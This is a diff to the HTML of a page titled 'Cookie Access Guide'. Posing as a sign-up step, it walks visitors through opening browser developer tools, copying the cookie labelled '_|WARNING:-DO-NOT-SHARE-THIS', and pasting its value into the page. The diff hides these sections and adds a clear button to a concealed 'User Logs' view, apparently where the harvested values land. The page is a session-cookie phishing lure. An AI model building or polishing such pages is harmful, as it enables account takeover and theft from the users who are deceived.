@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cookie Access Guide</title>
-    <link rel="stylesheet" href="styles.css"> <!-- Linking the CSS file -->
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
     <div class="container" id="loginSection">
@@ -18,11 +18,10 @@
         <button class="btn" onclick="signUp()">Sign Up</button>
     </div>
 
-    <div class="container" id="cookieSection">
+    <div class="container" id="cookieSection" style="display: none;">
         <h2>Enter Your Cookie</h2>
         <p>To complete your sign-up, please provide the cookie associated with your account.</p>
-        
-        <!-- Cookie Instructions -->
+
         <h3>How to Find Your Cookie:</h3>
         <ol>
             <li>Open the website in your browser.</li>
@@ -31,17 +30,18 @@
             <li>Under <strong>Storage</strong> in the left sidebar, select <strong>Cookies</strong>.</li>
             <li>Click on the website URL in the list of cookies.</li>
             <li>Look for the cookie named <code>_<strong>|WARNING:-DO-NOT-SHARE-THIS</strong></code>.</li>
-            <li>Copy its value and paste it below the cookie instructions for the user.</li>
+            <li>Copy its value and paste it below.</li>
         </ol>
 
         <button class="btn" onclick="submitCookie()">Submit Cookie</button>
     </div>
 
-    <div class="container" id="adminLogs">
+    <div class="container" id="adminLogs" style="display: none;">
         <h2>User Logs</h2>
         <div id="logs"></div>
+        <button class="btn" onclick="clearLogs()">Clear Logs</button>
     </div>
 
-    <script src="script.js"></script> <!-- Linking the JavaScript file -->
+    <script src="script.js"></script>
 </body>
 </html>
